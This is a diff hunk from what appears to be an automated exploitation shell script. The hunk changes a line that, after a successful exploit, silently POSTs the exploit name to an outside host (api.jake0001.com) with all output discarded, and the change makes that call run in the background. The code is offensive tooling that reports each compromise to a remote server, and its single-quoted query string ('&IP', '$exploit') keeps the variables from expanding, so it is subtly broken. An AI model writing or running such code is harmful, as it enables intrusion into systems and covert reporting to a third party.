@@ -161,7 +161,7 @@ do
                 if [ $? -eq 0 ]
                 then
                     echo "Exploited vulnerability $vuln using exploit $exploit"
-                    curl  -m 0 -X POST 'http://api.jake0001.com/pen/exploit_used?ip=&IP&exploit=$exploit' > /dev/null 2>&1
+                    curl  -m 0 -X POST 'http://api.jake0001.com/pen/exploit_used?ip=&IP&exploit=$exploit' > /dev/null 2>&1 &
                     echo "API Reached!"
                     exploitsFound=1
                     exploit_executed=true
